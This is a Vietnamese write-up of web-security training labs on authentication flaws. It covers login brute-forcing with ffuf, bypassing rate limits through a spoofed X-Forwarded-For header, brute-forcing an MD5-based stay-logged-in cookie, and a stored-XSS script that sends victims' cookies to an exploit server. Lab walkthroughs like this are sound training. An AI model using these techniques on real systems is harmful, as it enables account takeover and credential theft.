## Lab 1: Username enumeration via different responses

Mục tiêu: tìm ra tài khoản người dùng hợp lệ và đăng nhập thành công.

![Overview](/images/writeups/authentication-labs/image1.png)

Trong burp, request POST /login. Thử nhập tài khoản mật khẩu bất kỳ -> sai thông tin đăng nhập.

![Login attempt](/images/writeups/authentication-labs/image2.png)

![Login attempt](/images/writeups/authentication-labs/image3.png)

Brute-force bằng ffuf. Có 2 file chứa tài khoản và mật khẩu phổ biến.

![Wordlists](/images/writeups/authentication-labs/image4.png)

Khi đăng nhập thất bại phản hồi có mã 200.

![Response 200](/images/writeups/authentication-labs/image5.png)

Phản hồi khác 200 = login thành công.

Sử dụng ffuf để brute-force:

```bash
ffuf -w username.txt:USER -w password.txt:PASS \
-u https://0ab3000a038d3e7180a2ee9a007300cf.web-security-academy.net/login \
-X POST \
-d "username=USER&password=PASS" \
-H "Cookie: session=47N1qPjE3iUQSPtdOjLxFs0H6HJpeViO" \
-H "Content-Type: application/x-www-form-urlencoded" \
-fc 200
```

Lệnh này gửi lần lượt Post Request, thử tài khoản và mật khẩu, lọc phản hồi khác 200.

![ffuf running](/images/writeups/authentication-labs/image6.png)

![ffuf result](/images/writeups/authentication-labs/image7.png)

Đã tìm ra tài khoản hợp lệ, đăng nhập -> solve lab.

![Login](/images/writeups/authentication-labs/image8.png)

![Solved](/images/writeups/authentication-labs/image9.png)

## Lab 5: Username enumeration via response timing

Mục tiêu: tìm tài khoản và đăng nhập thành công.

![Overview](/images/writeups/authentication-labs/image39.png)

Rate limit khi gửi nhiều request.

![Rate limited](/images/writeups/authentication-labs/image40.png)

Server tin tưởng `X-Forwarded-For` -> bypass rate limit.

Header `X-Forwarded-For` thường được sử dụng bởi Load Balancers, Reverse Proxies, WAF để xác định IP gốc của client. Nếu server tin tưởng header này mà không xác thực, ta có thể giả mạo IP để bypass rate limit.

![Bypass success](/images/writeups/authentication-labs/image41.png)

Brute-force với nhiều IP khác nhau qua `X-Forwarded-For`. Dùng pitchfork mode.

## Lab 9: Brute-forcing a stay-logged-in cookie

Mục tiêu: đăng nhập vào carlos.

Trang web duy trì đăng nhập bằng cookie.

![Stay logged in](/images/writeups/authentication-labs/image77.png)

Tick "Stay logged in" -> server trả về cookie.

Cookie `stay-logged-in` khác với `session` cookie. Session cookie thường hết hạn khi đóng trình duyệt, còn `stay-logged-in` cookie duy trì phiên đăng nhập lâu dài.

![Cookies](/images/writeups/authentication-labs/image78.png)

Cookie là base64, giải mã:

![Decoded](/images/writeups/authentication-labs/image79.png)

32 bit = MD5. Băm "peter" để kiểm tra.

![MD5 match](/images/writeups/authentication-labs/image80.png)

Logic: Cookie = `Base64(username + ":" + MD5(password))`

Brute-force cookie thay vì form (có rate-limit).

![Intruder setup](/images/writeups/authentication-labs/image81.png)

![Password list](/images/writeups/authentication-labs/image82.png)

Payload processing: MD5.

![MD5 processing](/images/writeups/authentication-labs/image83.png)

## Lab 10: Offline password cracking

![Overview](/images/writeups/authentication-labs/image89.png)

![Overview](/images/writeups/authentication-labs/image90.png)

`HttpOnly` chỉ bật cho `session`, không bật cho `stay-logged-in` -> JS đọc được qua `document.cookie`.

![HttpOnly](/images/writeups/authentication-labs/image92.png)

Có thể đánh cắp cookie nếu trang web thực thi được JS.

Chức năng cmt bị lỗi Stored XSS.

![XSS](/images/writeups/authentication-labs/image93.png)

![XSS](/images/writeups/authentication-labs/image94.png)

Cmt script để đánh cắp cookie:

```html
<script>
document.location = 'https://exploit-<YOUR-ID>.exploit-server.net/stolen?' + document.cookie;
</script>
```

Carlos vào cmt, bị dính XSS, cookie gửi về máy chủ ta.

![Stolen cookie](/images/writeups/authentication-labs/image95.png)

Cookie là base64.

![Decoded](/images/writeups/authentication-labs/image96.png)

MD5 hash -> brute-force bằng hashcat.

![Hashcat](/images/writeups/authentication-labs/image97.png)

Tìm ra mật khẩu: `onceuponatime`.

Đăng nhập vào carlos, xóa tài khoản -> solve lab.
